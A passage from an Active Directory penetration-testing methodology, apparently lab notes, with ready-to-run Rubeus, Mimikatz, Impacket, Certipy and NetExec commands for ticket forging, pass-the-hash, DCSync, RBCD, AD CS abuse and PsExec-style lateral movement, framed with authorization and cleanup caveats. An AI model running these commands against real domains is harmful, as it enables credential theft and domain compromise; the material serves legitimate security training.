apply to the property/object. Duplicate SPNs, protected objects or policy can prevent the chain.

Commands and use-case variants > **Need:** A domain identity, appropriate host privilege, or a validated effective directory-object right. Matching client/realm/service, valid lifetime, compatible format and available KDC/service routes; ticket import affects a specific context ```cmd klist klist tgt klist sessions klist -li 0xLUID tickets klist -li 0xLUID tgt Rubeus.exe triage Rubeus.exe dump /luid:0xLUID /nowrap ``` > Do not run `klist purge` during triage. | Field/pattern | Interpretation | Decision | | --- | --- | --- | | `Client: USER @ REALM` | Identity represented | Map that exact user/computer and realm | | Client ending in `$` | Computer identity | Establish machine-account rights; do not treat as a human user | | `Server: krbtgt/REALM` | TGT | Can request service tickets while valid, within that client's authorization | | `Server: cifs/HOST` | CIFS service ticket | Only SMB/CIFS on the named host; authorization still applies | | `Server: ldap/DC_HOST` | LDAP service ticket | LDAP authentication, not replication rights | | Other `SERVICE/HOST` | Ticket for that SPN | Use matching hostname/service/client | | `Start/End/Renew Time` | Validity windows | Import cannot revive an expired/not-yet-valid ticket | | Ticket flags | Kerberos behavior/history | Not evidence of privilege | | `Kdc Called` | Issuing KDC | Not evidence of access to that DC | | Encryption/session key | Compatibility/policy clue | Not privilege or password strength | Linux cache: ```bash klist -c ticket.ccache export KRB5CCNAME="$PWD/ticket.ccache" ``` Convert only when a client expects the other container: ```bash impacket-ticketConverter ticket.kirbi ticket.ccache impacket-ticketConverter ticket.ccache ticket.kirbi ``` These commands establish a local ticket context. Block 12 selects and validates the remote service. Windows/Rubeus: ```cmd Rubeus.exe ptt /ticket:ticket.kirbi klist ``` Windows/Mimikatz: ```text kerberos::ptt ticket.kirbi kerberos::list ``` Linux: ```bash export KRB5CCNAME="$PWD/ticket.ccache" klist ``` NT hash or AES key to a TGT: ```cmd Rubeus.exe asktgt /user:USER /domain:DOMAIN /rc4:NT_HASH /dc:DC_HOST /ptt klist ``` Use `/aes128:` or `/aes256:` when that is the actual key type and tool version supports it. Mimikatz creates a new process using supplied key material: ```text sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:NT_HASH /run:cmd.exe ``` This is a credential/ticket-context transition, not proof that a destination accepts the identity. ```cmd klist klist tgt klist sessions ``` When privileges permit inspecting another logon session: ```cmd klist -li 0xLUID tickets klist -li 0xLUID tgt ``` ```cmd Rubeus.exe triage Rubeus.exe dump /luid:0xLUID /nowrap ``` > Do not use `klist purge` during triage. It destroys cached tickets and can break the current session. Interpret exported tickets using [Kerberos and identity transitions](../reference/06-ad-lateral-movement/03-kerberos-and-identity-transitions.md#6-ticket-inventory-classification-and-conversion). > **Verify:** Verify ticket client/server/lifetime and an actual service operation; record local versus network identity separately. > **If it fails:** IP-only naming, realm mismatch, expired lifetime, wrong logon session or unsupported tool Kerberos can break otherwise valid material.
Find: Forge a service-scoped ticket from the correct service key Classify a verified service key and correlate its account/SPN with the specific target service and domain SID. ```cmd setspn -Q SERVICE/TARGET_HOST whoami /user klist ``` > **Recognize:** The key must protect the intended service ticket; an arbitrary user's NT hash is not sufficient. > **Validate next:** Verify key type/current value, domain SID, principal/SPN, validation behavior and accepted target action. [Forge a service-scoped ticket from the correct service key](../notes/methods/ad-identities.md#kerberos-silver).
Commands and use-case variants > **Need:** A domain identity, appropriate host privilege, or a validated effective directory-object right. Correct service key/encryption type, domain SID, principal/SPN data and service validation behavior; modern PAC/KDC validation can constrain use > **Prerequisite:** key/hash of the account encrypting the target SPN's tickets, domain SID, exact SPN/service/host, a plausible existing domain identity and compatible target-service validation behavior. Linux/Impacket: ```bash impacket-ticketer -nthash SERVICE_NT_HASH -domain-sid DOMAIN_SID \ -domain DOMAIN -spn cifs/TARGET_HOST AUTHORIZED_TEST_USER export KRB5CCNAME="$PWD/AUTHORIZED_TEST_USER.ccache" klist ``` Windows/Mimikatz: ```text kerberos::golden /sid:DOMAIN_SID /domain:DOMAIN /target:TARGET_HOST /service:cifs /rc4:SERVICE_NT_HASH /user:AUTHORIZED_TEST_USER /ptt ``` Despite the Mimikatz module name, supplying a service/target key produces a silver/service ticket, not a krbtgt-signed TGT. Important boundaries: - the key must belong to the account that owns the SPN; machine-account keys commonly protect host services; - the ticket is limited to the named service/host and whichever services share the same account key; - current PAC enforcement means using a nonexistent identity can fail; use a real authorized test identity and validate behavior; - a service may perform KDC/PAC validation or additional authorization; - a successfully imported ticket is not successful service access. Golden tickets require the KRBTGT key and domain SID and create a forged TGT. They are a high-impact persistence concept covered in the [conditional domain-compromise section](../reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise.md#conditional-high-impact-ticket-forging-concepts), not a default Block 11 action. > **Verify:** Prove the intended service action and ticket context; ticket creation/import success alone is insufficient. > **If it fails:** Wrong key/SPN/SID or modern validation can reject the ticket. Prefer an existing valid credential/TGT route when enabled.
Find: Reset a target account password through a validated directory right Follow a mapped useful-user ACL edge and resolve the actual password-reset extended right for the controlled trustee. ```powershell Get-DomainObjectAcl -Identity TARGET_USER -ResolveGUIDs ``` > **Recognize:** An applicable reset operation changes a target credential; it does not reveal the old password. > **Validate next:** Validate effective membership, protection/account state, account utility and the authorized impact of a disruptive reset. [Reset a target account password through a validated directory right](../notes/methods/ad-identities.md#ad-password-reset).
Commands and use-case variants > **Need:** A domain identity, appropriate host privilege, or a validated effective directory-object right. Exact object/right and account state; the disruptive password change is justified within the assigned lab objective A password-reset right creates a new password credential; it does not reveal the old one. This is disruptive because an unknown original password cannot be restored. ```powershell $Secure = ConvertTo-SecureString 'TEMP_PASSWORD' -AsPlainText -Force Set-DomainUserPassword -Identity TARGET_USER -AccountPassword $Secure -Verbose net user TARGET_USER TEMP_PASSWORD /domain ``` Validate the account state and authenticate only to an approved service as the target identity. Prefer a reversible route when one exists. > **Verify:** Verify account identity and compatible authentication, then test relevant authorization. > **If it fails:** A stale/protected-object edge or policy can prevent the reset. Prefer a reversible SPN/group route when it achieves the objective.
Find: Add a controlled identity to a group through effective membership rights Select the useful group from mapping and inspect its current member list and exact member-attribute ACL. ```powershell Get-DomainGroupMember -Identity TARGET_GROUP Get-DomainObjectAcl -Identity TARGET_GROUP -ResolveGUIDs ``` > **Recognize:** A membership-write operation can grant a defined group capability once new logon/token state reflects it. > **Validate next:** Verify effective right, actual group-derived authorization, nesting/token refresh and restoration. [Add a controlled identity to a group through effective membership rights](../notes/methods/ad-identities.md#ad-group-control).
Commands and use-case variants > **Need:** A domain identity, appropriate host privilege, or a validated effective directory-object right. Exact target group, controlled principal, useful resulting right and a fresh token/logon context ```powershell Add-DomainGroupMember -Identity TARGET_GROUP -Members CONTROLLED_USER -Verbose Get-DomainGroupMember -Identity TARGET_GROUP | Where-Object { $_.MemberName -eq 'CONTROLLED_USER' } # Built-in alternative net group TARGET_GROUP CONTROLLED_USER /add /domain ``` A current session may not receive the new group SID until a fresh logon. Validate with a new session/token, then remove the membership after the authorized objective: ```powershell Remove-DomainGroupMember -Identity TARGET_GROUP -Members CONTROLLED_USER -Verbose -Confirm:$false net group TARGET_GROUP CONTROLLED_USER /delete /domain ``` > **Verify:** Verify directory membership and actual service action from a refreshed context, then restore the original membership. > **If it fails:** An old token, wrong group or nesting/policy behavior can leave authorization unchanged despite a successful modification.
Find: Convert ownership or DACL control into a narrower useful right Inspect resolved ownership/DACL rights on the exact useful object and separate the intermediate right from the final desired operation. ```powershell Get-DomainObjectAcl -Identity TARGET_OBJECT -ResolveGUIDs ``` > **Recognize:** Ownership/DACL control may enable a narrower useful ACE; it is an intermediate capability. > **Validate next:** Validate actual owner semantics, deny/protected-object behavior, ability to grant the next right and original-state restoration. [Convert ownership or DACL control into a narrower useful right](../notes/methods/ad-identities.md#ad-owner-dacl).
Commands and use-case variants > **Need:** A domain identity, appropriate host privilege, or a validated effective directory-object right. Correct object/ACE semantics, permission to perform the required intermediate change and a preserved original ACL/owner `WriteOwner` can make the controlled identity the owner; ownership may then permit a DACL change. `WriteDacl` can grant only the narrower right needed for the intended transition. ```powershell Set-DomainObjectOwner -Identity TARGET_OBJECT -OwnerIdentity CONTROLLED_USER -Verbose Add-DomainObjectAcl -TargetIdentity TARGET_OBJECT -PrincipalIdentity CONTROLLED_USER -Rights ResetPassword -Verbose # Group-membership variant Add-DomainObjectAcl -TargetIdentity TARGET_GROUP -PrincipalIdentity CONTROLLED_USER -Rights WriteMembers -Verbose # Remove the ACE after the authorized objective Remove-DomainObjectAcl -TargetIdentity TARGET_OBJECT -PrincipalIdentity CONTROLLED_USER -Rights ResetPassword -Verbose ``` Export the original owner/security descriptor before changing it and restore exactly that state. Password resets, membership changes, SPN writes, ownership changes and ACE grants are state changes; do not execute merely because a graph shows an edge. > **Verify:** Verify the intermediate owner/DACL state and final operation separately; restore original state afterward. > **If it fails:** Protected-object behavior, scope/inheritance or a missing intermediate right can break the chain.
Find: Use validated directory replication rights for bounded credential proof Inspect the domain naming-context ACL and resolve replication-specific extended rights for the controlled identity/group. ```powershell Get-DomainObjectAcl -Identity DOMAIN_DN -ResolveGUIDs ``` > **Recognize:** Replication rights at the domain scope are the relevant clue; local administrator rights on a member host are different. > **Validate next:** Verify the complete effective replication rights for selected data, trustee membership, DC/RPC route and identity context. [Use validated directory replication rights for bounded credential proof](../notes/methods/ad-identities.md#ad-dcsync).
Commands and use-case variants > **Need:** A domain identity, appropriate host privilege, or a validated effective directory-object right. Required replication extended rights, DC RPC connectivity and correct domain identity; access to a member server is insufficient > **Prerequisite:** effective domain-root rights equivalent to `Replicating Directory Changes` plus `Replicating Directory Changes All` (and filtered-set rights where applicable). Domain membership or local admin on an ordinary host is insufficient. Validate ACLs at the domain root: ```powershell Get-DomainObjectAcl -Identity 'DC=DOMAIN,DC=TLD' -ResolveGUIDs | Where-Object { $_.ObjectAceType -match 'Replication-Get-Changes' } ``` A controlled DACL transition can grant these rights, but doing so changes the domain security descriptor and creates a domain-compromise path: ```powershell Add-DomainObjectAcl -TargetIdentity 'DC=DOMAIN,DC=TLD' -PrincipalIdentity CONTROLLED_USER -Rights DCSync -Verbose # Remove the delegated replication ACE after the authorized objective Remove-DomainObjectAcl -TargetIdentity 'DC=DOMAIN,DC=TLD' -PrincipalIdentity CONTROLLED_USER -Rights DCSync -Verbose ``` Local administrator rights on a member host, an LDAP bind or a valid Kerberos ticket do not supply replication rights. Re-read the effective domain-root ACL before and after a change. Request one approved test account rather than dumping the directory: ```bash impacket-secretsdump -just-dc-user TARGET_USER -dc-ip DC_IP \ 'DOMAIN/USER:PASSWORD@DC_HOST' ``` Mimikatz equivalent from an authorized Windows context: ```text lsadump::dcsync /domain:DOMAIN /user:TARGET_USER ``` > **Decisive output:** selected directory secret material returned through replication. Treat it as domain compromise evidence. Stop, protect evidence, document the delegated right and move to remediation reasoning rather than broad collection. > **Verify:** Verify the replication source, account and material type; avoid equating a tool label with proven rights. > **If it fails:** RPC route, identity context and missing replication rights produce different failures; verify each prerequisite.
Find: Conditional: trace GPO control to privileged policy consumption Enumerate GPO/OU links, then inspect the relevant directory object and SYSVOL policy component's effective control and target applicability. ```powershell Get-DomainGPO Get-DomainOU | Select-Object name,gplink ``` > **Recognize:** A linked policy supplies a potential privileged consumer only for hosts to which it actually applies. > **Validate next:** Check both needed policy components, effective ACEs, security/WMI filtering, target scope and refresh trigger. [Conditional: trace GPO control to privileged policy consumption](../notes/methods/ad-identities.md#ad-gpo).
Commands and use-case variants > **Need:** A domain identity, appropriate host privilege, or a validated effective directory-object right. Effective rights on the necessary GPO components, applicable target scope/filtering, writable policy artifact and a privileged refresh trigger Identify GPOs and links: ```powershell Get-DomainGPO Get-DomainOU | Select-Object name,distinguishedname,gplink Get-DomainObjectAcl -SearchBase 'CN=Policies,CN=System,DC=DOMAIN,DC=TLD' -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteProperty' } ``` For a candidate, prove: 1. the controlled principal can edit both the directory object and relevant SYSVOL policy files; 2. the GPO is linked to the OU containing the intended test host/user; 3. security filtering and WMI filters include that subject; 4. the configured preference/task/script runs in the expected context; and 5. policy refresh or another predictable trigger will occur. SharpGPOAbuse supports immediate-task/local-group techniques, but syntax is version-sensitive and the action changes domain policy. Inspect the installed build before a controlled lab action: ```cmd SharpGPOAbuse.exe --help gpresult /r gpupdate /force ``` Back up the GPO, restrict the target/scope, document the exact change and restore it after validation. > **Verify:** Verify actual policy application and resulting privileged effect; retain/restorable original policy state. > **If it fails:** Wrong link, filtering, unavailable refresh or missing file rights invalidates the chain. Keep this as a conditional supplement.
Find: Conditional: use a validated delegation or RBCD relationship Inspect directory delegation flags/attributes and map the service principals before considering any impersonation request. ```powershell Get-DomainComputer -TrustedToAuth Get-DomainComputer -Unconstrained ``` > **Recognize:** A delegation flag opens a configuration investigation; unconstrained, constrained and RBCD require different relationships. > **Validate next:** Identify exact delegation type, controlled service/machine key, target SPN, relevant account flags and KDC acceptance. [Conditional: use a validated delegation or RBCD relationship](../notes/methods/ad-identities.md#ad-delegation).
Commands and use-case variants > **Need:** A domain identity, appropriate host privilege, or a validated effective directory-object right. Exact delegation type; required service/machine identity and key; allowed target/SPN; account flags and KDC policy permit the flow Enumerate before attempting any ticket operation: ```powershell Get-DomainComputer -Unconstrained | Select-Object dnshostname Get-DomainUser -TrustedToAuth | Select-Object samaccountname Get-DomainComputer -TrustedToAuth | Select-Object dnshostname Get-DomainObject -LDAPFilter '(msDS-AllowedToDelegateTo=*)' -Properties samaccountname,msds-allowedtodelegateto ``` ```bash impacket-findDelegation 'DOMAIN/USER:PASSWORD' -dc-ip DC_IP ``` Constrained delegation/S4U requires control of the delegated account/key and an allowed SPN: ```bash impacket-getST -spn ALLOWED_SPN -impersonate AUTHORIZED_TEST_USER \ -dc-ip DC_IP 'DOMAIN/DELEGATED_USER:PASSWORD' export KRB5CCNAME="$PWD/AUTHORIZED_TEST_USER.ccache" ``` Use the ticket only for the approved service/host. Unconstrained delegation can expose forwarded/cached tickets, but coercing authentication changes another host's behavior and is not a baseline. Validate only in a disposable authorized lab and protect ticket material. ##### Resource-based constrained delegation > **Prerequisite:** effective write control over the target computer's `msDS-AllowedToActOnBehalfOfOtherIdentity` plus control of a principal with an SPN (often a lab computer account). ```bash impacket-addcomputer 'DOMAIN/USER:PASSWORD' -computer-name 'LABCOMPUTER$' \ -computer-pass 'LAB_MACHINE_PASSWORD' -dc-host DC_HOST -dc-ip DC_IP impacket-rbcd -delegate-from 'LABCOMPUTER$' -delegate-to 'TARGETCOMPUTER$' \ -action write -dc-ip DC_IP 'DOMAIN/USER:PASSWORD' impacket-getST -spn cifs/TARGET_HOST -impersonate AUTHORIZED_TEST_USER \ -dc-ip DC_IP 'DOMAIN/LABCOMPUTER$:LAB_MACHINE_PASSWORD' ``` Cleanup after the lab objective: ```bash impacket-rbcd -delegate-from 'LABCOMPUTER$' -delegate-to 'TARGETCOMPUTER$' \ -action remove -dc-ip DC_IP 'DOMAIN/USER:PASSWORD' impacket-addcomputer 'DOMAIN/USER:PASSWORD' -computer-name 'LABCOMPUTER$' \ -delete -dc-ip DC_IP ``` Machine-account quota, computer-object rights, DNS/SPN naming and target service authorization are separate prerequisites. > **Verify:** Verify the exact service ticket and successful destination action, with original delegation state preserved. > **If it fails:** Protected accounts, unavailable service identity, unsupported encryption or wrong SPN can break the chain. Use only when the complete conditional path exists.
Find: Conditional: validate an AD CS enrollment-to-authentication path Enumerate the CA and enabled templates with the known directory identity, then read rights and settings rather than acting on an ESC label. ```bash certipy find -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP -enabled ``` > **Recognize:** The conjunction of purpose, subject control and effective enrollment rights is a candidate; issuance and identity mapping are separate gates. > **Validate next:** Check exact template/CA rights/settings, approval/signatures, required key, current mapping and authenticatable identity. [Conditional: validate an AD CS enrollment-to-authentication path](../notes/methods/ad-identities.md#ad-certificates).
Commands and use-case variants > **Need:** A domain identity, appropriate host privilege, or a validated effective directory-object right. Effective enrollment/template/CA rights and the exact vulnerable settings; issuance requirements, identity mapping and authentication route must all permit the path > **Prerequisite:** reachable CA/DC and a valid domain identity. **Decisive output:** a CA/template whose enabled state, enrollment rights and configuration satisfy a specific ESC path. Package names vary: ```bash command -v certipy-ad || command -v certipy certipy-ad find -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP \ -enabled -vulnerable -stdout ``` Review: - CA name and host; - template name and whether it is enabled/published; - who can enroll; - client-authentication EKUs/purpose; - subject/SAN supply controls; - manager approval/signature requirements; - template owner and modification rights; - web enrollment/relay-related configuration where relevant. An `ESC` label is a candidate classification. Manually validate the properties and the controlled identity's effective rights. Generic request after validating a specific template: ```bash certipy-ad req -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP \ -target DC_HOST -ca CA_NAME -template TEMPLATE ``` An alternate UPN/SID request is appropriate only when the validated template permits it and the lab explicitly authorizes impersonation testing: ```bash certipy-ad req -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP \ -target DC_HOST -ca CA_NAME -template TEMPLATE \ -upn 'TEST_USER@DOMAIN' -sid 'TEST_USER_SID' ``` ```bash certipy-ad auth -pfx CERTIFICATE.pfx -dc-ip DC_IP ``` Treat PFX files, tickets and returned hashes as credentials. Verify certificate subject/SID, validity and intended identity. A successful issuance is not the same as successful PKINIT authentication. Before any authorized template change, save configuration: ```bash certipy-ad template -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP \ -template TEMPLATE -save-configuration template-backup.json ``` Template writes alter Active Directory configuration and may affect many principals. Use only an explicitly authorized disposable lab path, inspect `certipy-ad template -h` for the installed version, and restore the saved configuration after the demonstration. > **Verify:** Verify issuance, matching private key, mapped account and a successful authentication effect; preserve and restore template changes. > **If it fails:** Denied enrollment, approval, mapping hardening or missing key material needs a different conditional route, not a renamed certificate tool.
Find: Conditional: understand a realm-wide TGT forgery from KRBTGT material Begin only after protected private evidence establishes the actual domain KRBTGT key and SID; inspect account/source metadata rather than assuming any domain hash suffices. ```cmd klist whoami /user ``` > **Recognize:** KRBTGT key exposure is the enabling post-compromise condition; an ordinary NT hash or unrelated ticket cannot substitute. > **Validate next:** Verify current cryptographic material/version, realm/SID/principal, time and actual service validation; retain recovery/cleanup scope. [Conditional: understand a realm-wide TGT forgery from KRBTGT material](../notes/methods/ad-identities.md#kerberos-golden).
Commands and use-case variants > **Need:** A domain identity, appropriate host privilege, or a validated effective directory-object right. Correct KRBTGT cryptographic material, realm/SID/principal data, valid ticket parameters and compatible service/KDC validation behavior Golden tickets require the domain SID and KRBTGT key. They are persistence/impact concepts, not a default Block 11 action. A forged ticket still depends on correct cryptographic material, realm, time and authorization. For the active service-scoped case, use [Silver tickets](../reference/06-ad-lateral-movement/03-kerberos-and-identity-transitions.md#8-silver-tickets-forge-one-service-ticket). Authorized isolated-lab examples: ```bash # Golden: realm-wide TGT material impacket-ticketer -nthash KRBTGT_NT_HASH -domain-sid DOMAIN_SID \ -domain DOMAIN AUTHORIZED_TEST_USER export KRB5CCNAME="$PWD/AUTHORIZED_TEST_USER.ccache" klist ``` Use only against the approved service/host, record ticket metadata and remove generated credentials afterward. Domain recovery after KRBTGT exposure generally requires coordinated credential rotation and replication convergence; service-ticket exposure requires rotating the affected service/machine secret and reviewing access. > **Verify:** Verify cryptographic source, represented principal and exact service effect; protect the key and remove generated test credentials. > **If it fails:** Wrong key/version, realm, time or validation behavior can reject a forged ticket. Prefer legitimate current tickets for ordinary movement.
### Move to another host
Find: Match route, destination service and effective authorization Use the discovered destination name/address and known credential record, then inspect the selected service ports from the actual direct or established pivot source. ```bash nmap -Pn -sT -p 135,445,3389,5985,5986 TARGET getent hosts TARGET_HOST ``` > **Recognize:** SMB/RPC are transport candidates while WinRM is not yet reachable; dynamic RPC and authorization are still untested. > **Validate next:** Probe the destination from the real source. Check DNS/service names and each required SMB/RPC/WinRM endpoint, then test effective service authorization. An open port and an accepted password do not establish a working remote execution method. [Match route, destination service and effective authorization](../notes/methods/lateral-movement.md#move-preflight).
Commands and use-case variants > **Need:** Identified authentication material, destination service reachability and a candidate authorized identity. Real source-to-service route, correct identity context and protocol-specific execution/logon rights | Material | Compatible starting paths | Important boundary | | --- | --- | --- | | Password | SMB/SCM, WMI/DCOM, WinRM/WinRS, RDP | Correct password does not grant the required logon or execution right | | NT hash | NTLM-capable SMB/WMI/WinRM; RDP only through Restricted Admin where supported | Net-NTLM and DCC2 are not reusable NT hashes | | TGT/ccache | Kerberos-capable tool using target FQDN/SPN | Ticket identity, realm, lifetime, DNS and KDC route must match | | TGS | Only the named `SERVICE/HOST` and compatible client | A CIFS ticket does not authorize WinRM, WMI or RDP | | AES/NT long-term key | Request a TGT, then use Kerberos | RC4/NT-key requests can fail where RC4 is disabled | | Local-account password/hash | NTLM or RDP in the target's local account context | Remote UAC/account restrictions commonly filter non-RID-500 local administrators | | Reachable service | Common execution/access mechanisms | Usual authorization | | --- | --- | --- | | SMB 445 + SCM/RPC | PsExec, SMBExec, service creation | Administrative share plus SCM/service rights | | RPC endpoint mapper 135 + dynamic RPC; often SMB for output | WMIExec, native CIM/WMI, DCOM | Remote WMI/DCOM rights, commonly an effective administrator token | | Task Scheduler RPC plus SMB output | ATExec | Remote task creation and administrative output access | | WinRM 5985/5986 | WinRS, PowerShell remoting, Evil-WinRM | Enabled endpoint and endpoint/session authorization | | RDP 3389 | FreeRDP, MSTSC | Remote-interactive logon right; Restricted Admin requires administrator access | Directly routed source: ```bash nmap -Pn -sT -sV -p 135,139,445,3389,5985,5986 TARGET -oN movement-preflight.txt getent hosts TARGET_HOST date -u ``` Windows source: ```powershell Resolve-DnsName TARGET_HOST Test-NetConnection TARGET_HOST -Port 445 Test-NetConnection TARGET_HOST -Port 5985 Test-NetConnection TARGET_HOST -Port 3389 w32tm /query /status ``` Port 135 alone does not prove WMI/DCOM viability because RPC commonly negotiates a dynamic high port. When the destination is reachable only through a pivot, perform these checks through the established Block 13 route and respect the client/proxy's transport limits. Record: ```text SOURCE POSITION -> TARGET FQDN/IP -> ROUTE -> SERVICE/PORT -> CREDENTIAL TYPE -> LOCAL/DOMAIN IDENTITY -> EXPECTED RIGHT -> CHOSEN METHOD -> EXPECTED EFFECT ``` NetExec can classify a selected SMB credential: ```bash # Domain password nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' # Domain NT hash nxc smb TARGET -d DOMAIN -u USER -H NT_HASH # Target-local account nxc smb TARGET -u Administrator -H NT_HASH --local-auth # Prove only share access nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' --shares ``` > A successful login proves SMB authentication. `(Pwn3d!)` is NetExec's SMB administrative-context indicator, not proof that WinRM, RDP, WMI or every SMB execution method will succeed. For one justified execution proof: ```bash nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' -x "hostname & whoami" --exec-method wmiexec ``` Current NetExec can select `wmiexec`, `atexec` or `smbexec`; without an explicit method it may fail over between them. Use a forced method when diagnosing prerequisites so the result remains attributable. ```text DOMAIN\USER -> domain identity; evaluate target-local group/right TARGET\USER -> SAM identity on that target ./USER -> tool-specific local-account selection ``` Common failure pattern: 1. a local account authenticates over SMB; 2. Windows issues a filtered remote token; 3. `ADMIN$`, SCM or WMI administrative operations fail. Do not “fix” this by changing `LocalAccountTokenFilterPolicy` during an attack workflow. Use a method already permitted by the target's configuration, the built-in Administrator where legitimately obtained and applicable, RDP if authorized, or another mapped identity. Remote process creation, stdout retrieval and an interactive shell are separate states: ```text AUTHENTICATED -> REMOTE OPERATION AUTHORIZED -> PROCESS/TASK/SERVICE CREATED -> COMMAND EFFECT OCCURRED -> OUTPUT RETURNED OR CALLBACK CONNECTED -> USABLE SESSION ``` - PsExec returns named-pipe I/O through its service. - WMIExec normally redirects output to an SMB share. - SMBExec redirects command output while repeatedly creating services. - ATExec writes output under `ADMIN$\Temp`. - Native WMI/DCOM may return only a PID/return value; verify a harmless file or another bounded effect. - WMI/DCOM/service processes commonly run in session 0, so a GUI is not visible to the logged-on user. - WinRM creates a remote shell/runspace and returns structured or text output. A WinRM/PowerShell session on HOST_A may not possess delegable credentials for HOST_B. That “double hop” is a credential-context problem, not proof that HOST_B or the password is wrong. Prefer executing from the source that actually holds the credential/ticket rather than enabling broad delegation. ```cmd hostname whoami /all ipconfig /all route print netstat -ano klist ``` Re-enumerate: 1. local privilege and accessible credential sources; 2. domain groups, ACLs, shares and host rights under the new identity; 3. logged-on sessions and service accounts; 4. interfaces, routes, DNS, listeners and internal reachability; 5. the next evidence-backed host/identity transition. Do not overwrite the earlier state. Record the source host, credential form, authentication protocol, execution method, returned identity and side effects. > **Verify:** Record exact source, credential type, destination name/service and successfully permitted operation. > **If it fails:** Do not infer every service works from an administrative SMB indicator. Separate authentication, route, execution and output-channel failures.
Find: Execute through uploaded service creation using PsExec From an accepted SMB identity inspect the required administrative share and the separate ability to create/start services on that host. ```bash nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' --shares ``` > **Recognize:** Administrative-share control is one PsExec prerequisite, not proof of every service/pipe operation. > **Validate next:** Validate actual SCM rights, binary compatibility, service start and named-pipe path; check the final execution identity. [Execute through uploaded service creation using PsExec](../notes/methods/lateral-movement.md#move-services).
Commands and use-case variants > **Need:** Identified authentication material, destination service reachability and a candidate authorized identity. SMB/SCM reachability, writable required share, effective service-creation/start rights and an accepted password/hash or supported Kerberos context ```bash # Password impacket-psexec 'DOMAIN/USER:PASSWORD@TARGET' # NT hash / Pass-the-Hash impacket-psexec -hashes :NT_HASH 'DOMAIN/USER@TARGET' ``` > **Need:** SMB 445/139, writable administrative share and Service Control Manager rights. Impacket uploads a RemCom service binary, creates/starts a service and communicates over named pipes. Verify the returned identity; the service context is commonly SYSTEM. Kerberos cache: ```bash export KRB5CCNAME="$PWD/USER.ccache" impacket-psexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP 'DOMAIN/USER@TARGET_HOST' ``` The target parameter uses the hostname matching the CIFS/HOST SPN; `-target-ip` separates connection routing from Kerberos naming. ```cmd PsExec64.exe -accepteula \\TARGET_HOST -u DOMAIN\USER -p PASSWORD cmd.exe ``` > The official PsExec binary is not built into Windows. It requires remote administrative access and creates the PSEXESVC service/artifacts. Avoid putting real passwords in retained shell history; an existing authorized network credential context is preferable. > **Verify:** Verify destination and represented execution identity, not only service creation or tool success. > **If it fails:** Share write, SCM access, service start, endpoint controls and pipe communication can fail independently.
Find: Execute commands through service command lines and SMB output Inspect known administrative SMB/SCM context and the output-share path when a service-command mechanism is preferable to binary upload. ```bash nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' --shares ``` > **Recognize:** A share and possible service rights suggest the command-line service route, whose output still has its own access path. > **Validate next:** Confirm service create/start, exact output mode/share and command effect independently from retrieved stdout. [Execute commands through service command lines and SMB output](../notes/methods/lateral-movement.md#move-smbexec).
Commands and use-case variants > **Need:** Identified authentication material, destination service reachability and a candidate authorized identity. Accepted authentication, service create/start rights and the selected output-share/server path ```bash impacket-smbexec 'DOMAIN/USER:PASSWORD@TARGET' impacket-smbexec -hashes :NT_HASH 'DOMAIN/USER@TARGET' ``` > SMBExec creates temporary services whose command lines redirect output through a share. It does not use the same uploaded RemCom binary as PsExec, but it still requires SCM/service rights and produces substantial service/event artifacts.
Kerberos and alternate output modes ```bash export KRB5CCNAME="$PWD/USER.ccache" impacket-smbexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP 'DOMAIN/USER@TARGET_HOST' # SHARE is default; SERVER starts a local SMB server and needs permission to bind locally. impacket-smbexec -mode SHARE -share C$ 'DOMAIN/USER:PASSWORD@TARGET' ```
> **Verify:** Verify command effect separately from successful output retrieval and remove created artifacts as appropriate. > **If it fails:** Missing output can coexist with successful execution. Check service event/effect and share permissions before changing payloads.
Find: Execute through remote Task Scheduler Use destination RPC/SMB evidence and effective administrative/task rights to investigate Task Scheduler as a one-shot execution consumer. ```powershell Test-NetConnection TARGET -Port 135 Test-NetConnection TARGET -Port 445 ``` > **Recognize:** The required network services are candidates; a task cannot be assumed creatable from port results. > **Validate next:** Check negotiated RPC reachability, task-create permission, actual principal and administrative output channel. [Execute through remote Task Scheduler](../notes/methods/lateral-movement.md#move-tasks).
Commands and use-case variants > **Need:** Identified authentication material, destination service reachability and a candidate authorized identity. Task Scheduler RPC reachability, effective task-creation rights and the required administrative output access ```bash impacket-atexec 'DOMAIN/USER:PASSWORD@TARGET_HOST' "cmd.exe /c hostname & whoami" impacket-atexec -hashes :NT_HASH 'DOMAIN/USER@TARGET_HOST' "cmd.exe /c hostname & whoami" ``` > ATExec creates and deletes a scheduled task and normally retrieves output from `ADMIN$\Temp`. It is a one-shot command mechanism, not an interactive shell; task-scheduler RPC and administrative share access must both work. Kerberos: ```bash export KRB5CCNAME="$PWD/USER.ccache" impacket-atexec -k -no-pass -dc-ip DC_IP 'DOMAIN/USER@TARGET_HOST' "cmd.exe /c hostname & whoami" ``` > **Verify:** Verify the actual task effect/principal and destination, not task registration alone. > **If it fails:** Dynamic RPC filtering, task authorization or denied output share can break different phases.
Find: Execute through WMI or native CIM over DCOM Investigate WMI from RPC/service inventory and exact account rights; keep process creation and SMB-based output retrieval as separate legs. ```powershell Test-NetConnection TARGET -Port 135 Test-NetConnection TARGET -Port 445 ``` > **Recognize:** Port 135 and an output route justify further checks but do not prove a WMI process can be created. > **Validate next:** Validate dynamic ports, DCOM/WMI authorization, native CIM transport choice and actual effect. [Execute through WMI or native CIM over DCOM](../notes/methods/lateral-movement.md#move-wmi).
